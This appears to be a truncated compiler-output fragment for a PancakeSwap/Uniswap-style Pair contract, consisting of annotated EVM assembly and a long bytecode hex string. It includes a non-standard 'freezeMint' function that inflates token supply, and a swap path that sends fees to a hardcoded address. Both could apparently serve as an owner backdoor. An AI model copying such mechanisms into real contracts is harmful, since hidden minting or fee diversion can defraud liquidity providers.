rootK.mul(17) */\n      tag_374\n        /* \"Pair.sol\":4885:4890  rootK */\n      dup7\n        /* \"Pair.sol\":4895:4897  17 */\n      0x11\n        /* \"Pair.sol\":4885:4898  rootK.mul(17) */\n      0xffffffff\n        /* \"Pair.sol\":4885:4894  rootK.mul */\n      tag_175\n        /* \"Pair.sol\":4885:4898  rootK.mul(17) */\n      and\n      jump\t// in\n    tag_374:\n        /* \"Pair.sol\":4885:4902  rootK.mul(17).add */\n      swap1\n        /* \"Pair.sol\":4885:4920  rootK.mul(17).add(rootKLast.mul(8)) */\n      0xffffffff\n        /* \"Pair.sol\":4885:4902  rootK.mul(17).add */\n      tag_358\n        /* \"Pair.sol\":4885:4920  rootK.mul(17).add(rootKLast.mul(8)) */\n      and\n      jump\t// in\n    tag_372:\n        /* \"Pair.sol\":4866:4920  uint denominator = rootK.mul(17).add(rootKLast.mul(8)) */\n      swap1\n      pop\n        /* \"Pair.sol\":4942:4956  uint liquidity */\n      0x00\n        /* \"Pair.sol\":4971:4982  denominator */\n      dup2\n        /* \"Pair.sol\":4959:4968  numerator */\n      dup4\n        /* \"Pair.sol\":4959:4982  numerator / denominator */\n      dup2\n      tag_375\n      jumpi\n      invalid\n    tag_375:\n      div\n      swap1\n      pop\n        /* \"Pair.sol\":5008:5021  liquidity > 0 */\n      dup1\n      iszero\n        /* \"Pair.sol\":5004:5046  if (liquidity > 0) _mint(feeTo, liquidity) */\n      tag_377\n      jumpi\n        /* \"Pair.sol\":5023:5046  _mint(feeTo, liquidity) */\n      tag_377\n        /* \"Pair.sol\":5029:5034  feeTo */\n      dup8\n        /* \"Pair.sol\":5036:5045  liquidity */\n      dup3\n        /* \"Pair.sol\":5023:5028  _mint */\n      tag_221\n        /* \"Pair.sol\":5023:5046  _mint(feeTo, liquidity) */\n      jump\t// in\n    tag_377:\n        /* \"Pair.sol\":4692:5065  if (rootK > rootKLast) {... */\n      pop\n      pop\n      pop\n    tag_368:\n        /* \"Pair.sol\":4533:5079  if (_kLast != 0) {... */\n      pop\n      pop\n    tag_364:\n        /* \"Pair.sol\":4508:5146  if (feeOn) {... */\n      jump(tag_379)\n    tag_363:\n        /* \"Pair.sol\":5099:5110  _kLast != 0 */\n      dup1\n      iszero\n        /* \"Pair.sol\":5095:5146  if (_kLast != 0) {... */\n      tag_379\n      jumpi\n        /* \"Pair.sol\":5134:5135  0 */\n      0x00\n        /* \"Pair.sol\":5126:5131  kLast */\n      0x0e\n        /* \"Pair.sol\":5126:5135  kLast = 0 */\n      sstore\n        /* \"Pair.sol\":5095:5146  if (_kLast != 0) {... */\n    tag_379:\n        /* \"Pair.sol\":4259:5152  function _mintFee(... */\n      pop\n      pop\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n    tag_219:\n        /* \"Math.sol\":400:409  uint256 z */\n      0x00\n        /* \"Math.sol\":429:430  3 */\n      0x03\n        /* \"Math.sol\":425:426  y */\n      dup3\n        /* \"Math.sol\":425:430  y > 3 */\n      gt\n        /* \"Math.sol\":421:647  if (y > 3) {... */\n      iszero\n      tag_381\n      jumpi\n      pop\n        /* \"Math.sol\":450:451  y */\n      dup1\n        /* \"Math.sol\":485:486  1 */\n      0x01\n        /* \"Math.sol\":481:482  2 */\n      0x02\n        /* \"Math.sol\":477:482  y / 2 */\n      dup3\n      div\n        /* \"Math.sol\":477:486  y / 2 + 1 */\n      add\n        /* \"Math.sol\":500:589  while (x < z) {... */\n    tag_383:\n        /* \"Math.sol\":511:512  z */\n      dup2\n        /* \"Math.sol\":507:508  x */\n      dup2\n        /* \"Math.sol\":507:512  x < z */\n      lt\n        /* \"Math.sol\":500:589  while (x < z) {... */\n      iszero\n      tag_384\n      jumpi\n        /* \"Math.sol\":536:537  x */\n      dup1\n        /* \"Math.sol\":532:537  z = x */\n      swap2\n      pop\n        /* \"Math.sol\":573:574  2 */\n      0x02\n        /* \"Math.sol\":568:569  x */\n      dup2\n        /* \"Math.sol\":564:565  x */\n      dup3\n        /* \"Math.sol\":560:561  y */\n      dup6\n        /* \"Math.sol\":560:565  y / x */\n      dup2\n      tag_385\n      jumpi\n      invalid\n    tag_385:\n      div\n        /* \"Math.sol\":560:569  y / x + x */\n      add\n        /* \"Math.sol\":559:574  (y / x + x) / 2 */\n      dup2\n      tag_386\n      jumpi\n      invalid\n    tag_386:\n      div\n        /* \"Math.sol\":555:574  x = (y / x + x) / 2 */\n      swap1\n      pop\n        /* \"Math.sol\":500:589  while (x < z) {... */\n      jump(tag_383)\n    tag_384:\n        /* \"Math.sol\":421:647  if (y > 3) {... */\n      pop\n      jump(tag_388)\n    tag_381:\n        /* \"Math.sol\":609:615  y != 0 */\n      dup2\n      iszero\n        /* \"Math.sol\":605:647  if (y != 0) {... */\n      tag_388\n      jumpi\n      pop\n        /* \"Math.sol\":635:636  1 */\n      0x01\n        /* \"Math.sol\":605:647  if (y != 0) {... */\n    tag_388:\n        /* \"Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":1508:1708  function _mint(address to, uint256 value) internal {... */\n    tag_221:\n        /* \"ERC20.sol\":1583:1594  totalSupply */\n      sload(0x00)\n        /* \"ERC20.sol\":1583:1605  totalSupply.add(value) */\n      tag_390\n      swap1\n        /* \"ERC20.sol\":1599:1604  value */\n      dup3\n        /* \"ERC20.sol\":1583:1605  totalSupply.add(value) */\n      0xffffffff\n        /* \"ERC20.sol\":1583:1598  totalSupply.add */\n      tag_358\n        /* \"ERC20.sol\":1583:1605  totalSupply.add(value) */\n      and\n      jump\t// in\n    tag_390:\n        /* \"ERC20.sol\":1569:1580  totalSupply */\n      0x00\n        /* \"ERC20.sol\":1569:1605  totalSupply = totalSupply.add(value) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":1631:1644  balanceOf[to] */\n      dup4\n      and\n      dup2\n      mstore\n        /* \"ERC20.sol\":1631:1640  balanceOf */\n      0x01\n        /* \"ERC20.sol\":1631:1644  balanceOf[to] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      tag_391\n      swap1\n        /* \"ERC20.sol\":1649:1654  value */\n      dup3\n        /* \"ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"ERC20.sol\":1631:1648  balanceOf[to].add */\n      tag_358\n        /* \"ERC20.sol\":1631:1655  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_391:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":1615:1628  balanceOf[to] */\n      dup4\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":1615:1624  balanceOf */\n      0x01\n        /* \"ERC20.sol\":1615:1628  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":1615:1655  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"ERC20.sol\":1670:1701  Transfer(address(0), to, value) */\n      dup4\n      mload\n      dup6\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"ERC20.sol\":1615:1628  balanceOf[to] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"ERC20.sol\":1670:1701  Transfer(address(0), to, value) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":1508:1708  function _mint(address to, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_228:\n        /* \"Math.sol\":192:201  uint256 z */\n      0x00\n        /* \"Math.sol\":221:222  y */\n      dup2\n        /* \"Math.sol\":217:218  x */\n      dup4\n        /* \"Math.sol\":217:222  x < y */\n      lt\n        /* \"Math.sol\":217:230  x < y ? x : y */\n      tag_393\n      jumpi\n        /* \"Math.sol\":229:230  y */\n      dup2\n        /* \"Math.sol\":217:230  x < y ? x : y */\n      jump(tag_394)\n    tag_393:\n        /* \"Math.sol\":225:226  x */\n      dup3\n        /* \"Math.sol\":217:230  x < y ? x : y */\n    tag_394:\n        /* \"Math.sol\":213:230  z = x < y ? x : y */\n      swap4\n        /* \"Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":2196:2404  function _burn(address from, uint256 value) internal {... */\n    tag_252:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2277:2292  balanceOf[from] */\n      dup3\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2277:2286  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2277:2292  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      tag_396\n      swap1\n        /* \"ERC20.sol\":2297:2302  value */\n      dup3\n        /* \"ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2277:2296  balanceOf[from].sub */\n      tag_177\n        /* \"ERC20.sol\":2277:2303  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_396:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2259:2274  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2259:2268  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2259:2274  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup2\n      keccak256\n        /* \"ERC20.sol\":2259:2303  balanceOf[from] = balanceOf[from].sub(value) */\n      swap2\n      swap1\n      swap2\n      sstore\n        /* \"ERC20.sol\":2327:2338  totalSupply */\n      sload\n        /* \"ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      tag_397\n      swap1\n        /* \"ERC20.sol\":2343:2348  value */\n      dup3\n        /* \"ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2327:2342  totalSupply.sub */\n      tag_177\n        /* \"ERC20.sol\":2327:2349  totalSupply.sub(value) */\n      and\n      jump\t// in\n    tag_397:\n        /* \"ERC20.sol\":2313:2324  totalSupply */\n      0x00\n        /* \"ERC20.sol\":2313:2349  totalSupply = totalSupply.sub(value) */\n      swap1\n      dup2\n      sstore\n        /* \"ERC20.sol\":2364:2397  Transfer(from, address(0), value) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      and\n      swap2\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap2\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":2196:2404  function _burn(address from, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":1714:2190  function freezeMint(... */\n    tag_303:\n        /* \"ERC20.sol\":1807:1811  bool */\n      0x00\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":1869:1890  account != address(0) */\n      dup4\n      and\n        /* \"ERC20.sol\":1861:1926  require(account != address(0), \"BEP20: mint to the zero address\") */\n      tag_399\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x42455032303a206d696e7420746f20746865207a65726f206164647265737300\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_399:\n        /* \"ERC20.sol\":2016:2027  totalSupply */\n      sload(0x00)\n        /* \"ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      tag_400\n      swap1\n        /* \"ERC20.sol\":2032:2038  amount */\n      dup4\n        /* \"ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      0xffffffff\n        /* \"ERC20.sol\":2016:2031  totalSupply.add */\n      tag_358\n        /* \"ERC20.sol\":2016:2039  totalSupply.add(amount) */\n      and\n      jump\t// in\n    tag_400:\n        /* \"ERC20.sol\":2002:2013  totalSupply */\n      0x00\n        /* \"ERC20.sol\":2002:2039  totalSupply = totalSupply.add(amount) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2075:2098  _frozenBalance[account] */\n      dup5\n      and\n      dup2\n      mstore\n        /* \"ERC20.sol\":2075:2089  _frozenBalance */\n      0x03\n        /* \"ERC20.sol\":2075:2098  _frozenBalance[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      tag_401\n      swap1\n        /* \"ERC20.sol\":2103:2109  amount */\n      dup4\n        /* \"ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      0xffffffff\n        /* \"ERC20.sol\":2075:2102  _frozenBalance[account].add */\n      tag_358\n        /* \"ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      and\n      jump\t// in\n    tag_401:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2049:2072  _frozenBalance[account] */\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":2049:2063  _frozenBalance */\n      0x03\n        /* \"ERC20.sol\":2049:2072  _frozenBalance[account] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":2049:2110  _frozenBalance[account] = _frozenBalance[account].add(amount) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"ERC20.sol\":2125:2162  Transfer(address(0), account, amount) */\n      dup4\n      mload\n      dup7\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"ERC20.sol\":2049:2072  _frozenBalance[account] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"ERC20.sol\":2125:2162  Transfer(address(0), account, amount) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n      pop\n        /* \"ERC20.sol\":2179:2183  true */\n      0x01\n        /* \"ERC20.sol\":1714:2190  function freezeMint(... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"UQ112x112.sol\":321:439  function encode(uint112 y) internal pure returns (uint224 z) {... */\n    tag_350:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"UQ112x112.sol\":396:406  uint224(y) */\n      and\n      shl(0x70, 0x01)\n        /* \"UQ112x112.sol\":396:413  uint224(y) * Q112 */\n      mul\n      swap1\n        /* \"UQ112x112.sol\":321:439  function encode(uint112 y) internal pure returns (uint224 z) {... */\n      jump\t// out\n        /* \"UQ112x112.sol\":507:613  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n    tag_351:\n        /* \"UQ112x112.sol\":567:576  uint224 z */\n      0x00\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"UQ112x112.sol\":596:606  uint224(y) */\n      dup3\n      and\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"UQ112x112.sol\":592:606  x / uint224(y) */\n      dup5\n      and\n        /* \"UQ112x112.sol\":596:606  uint224(y) */\n      dup2\n        /* \"UQ112x112.sol\":592:606  x / uint224(y) */\n      tag_404\n      jumpi\n      invalid\n    tag_404:\n      div\n      swap4\n        /* \"UQ112x112.sol\":507:613  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_358:\n        /* \"SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_188\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    stop\n    data_1b988f8784cc3cf7ad7d1bf59197df07b7925b5a748a478400a8f83fd9e196ef 4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6e\n    data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c 50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54\n    data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e 556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n    data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544\n    data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n    data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8 50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54\n    data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n\n    auxdata: 0xa265627a7a72315820cf9089f787db5c2a6ca32ebe2dc67686be59ff857f8ac479e4a2edbca7aaf7c464736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052600680546001600160a01b031916739e94ee69f3cdcd5e74e05563736e4679da6db44c179055600160105534801561003b57600080fd5b50604051469080605261290182396040805191829003605201822082820182526007808452664b4243204c507360c81b6020948501528251808401845260018152603160f81b908501528251808501929092527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe828401527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606083015260808201959095523060a0808301919091528251808303909101815260c090910190915280519101206004555080546001600160a01b031990811633908117909255600f805490911690911790556127cb806101366000396000f3fe608060405234801561001057600080fd5b50600436106101fb5760003560e01c806370a082311161011a578063ba9a7a56116100ad578063d505accf1161007c578063d505accf146105e9578063dcbbb3731461063a578063dd62ed3e14610660578063f317739c1461068e578063fff6cae914610696576101fb565b8063ba9a7a56146105ab578063bc25cf77146105b3578063c45a0155146105d9578063d21220a7146105e1576101fb565b80638da5cb5b116100e95780638da5cb5b14610567578063900820d81461056f57806395d89b4114610577578063a9059cbb1461057f576101fb565b806370a08231146104d45780637464fc3d146104fa5780637ecebe001461050257806389afcb4414610528576101fb565b806330adf81f116101925780635909c0d5116101615780635909c0d5146104815780635a3d5493146104895780636488f7b0146104915780636a627842146104ae576101fb565b806330adf81f1461042d578063313ce567146104355780633644e5151461045357806347d5d8561461045b576101fb565b80630dfe1681116101ce5780630dfe1681146103835780631794bb3c146103a757806318160ddd146103dd57806323b872dd146103f7576101fb565b8063022c0d9f1461020057806306fdde031461028e5780630902f1ac1461030b578063095ea7b314610343575b600080fd5b61028c6004803603608081101561021657600080fd5b8135916020810135916001600160a01b03604083013516919081019060808101606082013564010000000081111561024d57600080fd5b82018360208201111561025f57600080fd5b8035906020019184600183028401116401000000008311171561028157600080fd5b50909250905061069e565b005b610296610c7a565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102d05781810151838201526020016102b8565b50505050905090810190601f1680156102fd5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610313610c9d565b604080516001600160701b03948516815292909316602083015263ffffffff168183015290519081900360600190f35b61036f6004803603604081101561035957600080fd5b506001600160a01b038135169060200135610cc7565b604080519115158252519081900360200190f35b61038b610cde565b604080516001600160a01b039092168252519081900360200190f35b61028c600480360360608110156103bd57600080fd5b506001600160a01b03813581169160208101359091169060400135610ced565b6103e5610d76565b60408051918252519081900360200190f35b61036f6004803603606081101561040d57600080fd5b506001600160a01b03813581169160208101359091169060400135610d7c565b6103e5610e16565b61043d610e3a565b6040805160ff9092168252519081900360200190f35b6103e5610e3f565b6103e56004803603602081101561047157600080fd5b50356001600160a01b0316610e45565b6103e5610e57565b6103e5610e5d565b61028c600480360360208110156104a757600080fd5b5035610e63565b6103e5600480360360208110156104c457600080fd5b50356001600160a01b0316610eb1565b6103e5600480360360208110156104ea57600080fd5b50356001600160a01b03166111af565b6103e56111c1565b6103e56004803603602081101561051857600080fd5b50356001600160a01b03166111c7565b61054e6004803603602081101561053e57600080fd5b50356001600160a01b03166111d9565b6040805192835260208301919091528051918290030190f35b61038b61157d565b61038b61158c565b61029661159b565b61036f6004803603604081101561059557600080fd5b506001600160a01b0381351690602001356115bd565b6103e56115ca565b61028c600480360360208110156105c957600080fd5b50356001600160a01b03166115d0565b61038b611739565b61038b611748565b61028c600480360360e08110156105ff57600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135611757565b6103e56004803603602081101561065057600080fd5b50356001600160a01b0316611957565b6103e56004803603604081101561067657600080fd5b506001600160a01b0381358116916020013516611ba6565b6103e5611bc3565b61028c611bc9565b6010546001146106e7576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601055841515806106fa5750600084115b6107355760405162461bcd60e51b815260040180806020018281038252602381526020018061274e6023913960400191505060405180910390fd5b600080610740610c9d565b5091509150816001600160701b0316871080156107655750806001600160701b031686105b6107b6576040805162461bcd60e51b815260206004820152601f60248201527f50616e63616b653a20494e53554646494349454e545f4c495155494449545900604482015290519081900360640190fd5b60008060006064600a548b02816107c957fe5b048a03905060006064600a548b02816107de57fe5b600854600954929091048c0392506001600160a01b03908116918116908b16821480159061081e5750806001600160a01b03168b6001600160a01b031614155b610865576040805162461bcd60e51b815260206004820152601360248201527250616e63616b653a20494e56414c49445f544f60681b604482015290519081900360640190fd5b8c1561087657610876828c86611d29565b8b1561088757610887818c85611d29565b8815610942578a6001600160a01b031663848008123386868e8e6040518663ffffffff1660e01b815260040180866001600160a01b03166001600160a01b03168152602001858152602001848152602001806020018281038252848482818152602001925080828437600081840152601f19601f8201169050808301925050509650505050505050600060405180830381600087803b15801561092957600080fd5b505af115801561093d573d6000803e3d6000fd5b505050505b60006064600a548f028161095257fe5b04905060006064600a548f028161096557fe5b0490508e15610986576006546109869085906001600160a01b031684611d29565b8d156109a4576006546109a49084906001600160a01b031683611d29565b604080516370a0823160e01b815230600482015290516001600160a01b038616916370a08231916024808301926020929190829003018186803b1580156109ea57600080fd5b505afa1580156109fe573d6000803e3d6000fd5b505050506040513d6020811015610a1457600080fd5b5051604080516370a0823160e01b815230600482015290519199506001600160a01b038516916370a0823191602480820192602092909190829003018186803b158015610a6057600080fd5b505afa158015610a74573d6000803e3d6000fd5b505050506040513d6020811015610a8a57600080fd5b505196506000955050505050506001600160701b0385168a90038311610ab1576000610ac0565b89856001600160701b03160383035b9050600089856001600160701b0316038311610add576000610aec565b89856001600160701b03160383035b90506000821180610afd5750600081115b610b385760405162461bcd60e51b81526004018080602001828103825260228152602001806126be6022913960400191505060405180910390fd5b6000610b6c610b4e84601963ffffffff611ec316565b610b608761271063ffffffff611ec316565b9063ffffffff611f2616565b90506000610b84610b4e84601963ffffffff611ec316565b9050610bb66305f5e100610baa6001600160701b038b8116908b1663ffffffff611ec316565b9063ffffffff611ec316565b610bc6838363ffffffff611ec316565b1015610c06576040805162461bcd60e51b815260206004820152600a60248201526950616e63616b653a204b60b01b604482015290519081900360640190fd5b5050610c1484848888611f76565b60408051838152602081018390528082018d9052606081018c905290516001600160a01b038b169133917fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d8229181900360800190a350506001601055505050505050505050565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b600b546001600160701b0380821692600160701b830490911691600160e01b900463ffffffff1690565b6000610cd4338484612139565b5060015b92915050565b6008546001600160a01b031681565b6007546001600160a01b03163314610d41576040805162461bcd60e51b81526020600482015260126024820152712830b731b0b5b29d102327a92124a22222a760711b604482015290519081900360640190fd5b600880546001600160a01b039485166001600160a01b0319918216179091556009805493909416921691909117909155600a55565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610e01576001600160a01b0384166000908152600260209081526040808320338452909152902054610ddc908363ffffffff611f2616565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b610e0c84848461219b565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b600c5481565b600d5481565b600f546001600160a01b03163314610eac5760405162461bcd60e51b815260040180806020018281038252602181526020018061269d6021913960400191505060405180910390fd5b600a55565b6000601054600114610efc576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601081905580610f0c610c9d565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015610f6057600080fd5b505afa158015610f74573d6000803e3d6000fd5b505050506040513d6020811015610f8a57600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015610fdd57600080fd5b505afa158015610ff1573d6000803e3d6000fd5b505050506040513d602081101561100757600080fd5b505190506000611026836001600160701b03871663ffffffff611f2616565b90506000611043836001600160701b03871663ffffffff611f2616565b905060006110518787612243565b6000549091508061108e5761107a6103e8610b60611075878763ffffffff611ec316565b6123b6565b985061108960006103e8612408565b6110dd565b6110da6001600160701b0389166110ab868463ffffffff611ec316565b816110b257fe5b046001600160701b0389166110cd868563ffffffff611ec316565b816110d457fe5b0461248c565b98505b6000891161111c5760405162461bcd60e51b81526004018080602001828103825260268152602001806127716026913960400191505060405180910390fd5b6111268a8a612408565b61113286868a8a611f76565b811561116257600b5461115e906001600160701b0380821691600160701b90041663ffffffff611ec316565b600e555b6040805185815260208101859052815133927f4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f928290030190a25050600160105550949695505050505050565b60016020526000908152604090205481565b600e5481565b60056020526000908152604090205481565b600080601054600114611225576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601081905580611235610c9d565b50600854600954604080516370a0823160e01b815230600482015290519496509294506001600160a01b039182169391169160009184916370a08231916024808301926020929190829003018186803b15801561129157600080fd5b505afa1580156112a5573d6000803e3d6000fd5b505050506040513d60208110156112bb57600080fd5b5051604080516370a0823160e01b815230600482015290519192506000916001600160a01b038516916370a08231916024808301926020929190829003018186803b15801561130957600080fd5b505afa15801561131d573d6000803e3d6000fd5b505050506040513d602081101561133357600080fd5b5051306000908152600160205260408120549192506113528888612243565b60005490915080611369848763ffffffff611ec316565b8161137057fe5b049a5080611384848663ffffffff611ec316565b8161138b57fe5b04995060008b11801561139e575060008a115b6113d95760405162461bcd60e51b81526004018080602001828103825260268152602001806127086026913960400191505060405180910390fd5b6113e330846124a4565b6113ee878d8d611d29565b6113f9868d8c611d29565b604080516370a0823160e01b815230600482015290516001600160a01b038916916370a08231916024808301926020929190829003018186803b15801561143f57600080fd5b505afa158015611453573d6000803e3d6000fd5b505050506040513d602081101561146957600080fd5b5051604080516370a0823160e01b815230600482015290519196506001600160a01b038816916370a0823191602480820192602092909190829003018186803b1580156114b557600080fd5b505afa1580156114c9573d6000803e3d6000fd5b505050506040513d60208110156114df57600080fd5b505193506114ef85858b8b611f76565b811561151f57600b5461151b906001600160701b0380821691600160701b90041663ffffffff611ec316565b600e555b604080518c8152602081018c905281516001600160a01b038f169233927fdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496929081900390910190a35050505050505050506001601081905550915091565b600f546001600160a01b031681565b6006546001600160a01b031681565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b6000610cd433848461219b565b6103e881565b601054600114611619576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601055600854600954600b54604080516370a0823160e01b815230600482015290516001600160a01b0394851694909316926116c892859287926116c3926001600160701b03169185916370a0823191602480820192602092909190829003018186803b15801561168b57600080fd5b505afa15801561169f573d6000803e3d6000fd5b505050506040513d60208110156116b557600080fd5b50519063ffffffff611f2616565b611d29565b600b54604080516370a0823160e01b81523060048201529